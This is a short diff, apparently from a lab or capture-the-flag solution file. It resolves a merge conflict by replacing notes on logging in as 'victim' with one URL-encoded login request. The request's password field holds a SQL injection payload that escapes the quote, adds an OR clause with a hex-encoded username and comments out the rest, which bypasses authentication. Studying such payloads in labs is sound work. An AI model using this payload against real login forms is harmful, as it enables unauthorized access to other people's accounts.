@@ -1,8 +1,1 @@
-<<<<<<< HEAD
-Login successful! (victim\)
-=======
-Output: Login successful! (victim\)
-
-username: victim\
-password: anything
->>>>>>> c1902fd6a569fb30599f9ad7b72d1d55368ee0b6
+username=victim&password=%5C%27%20OR%20username%3D0x76696374696d%20%23
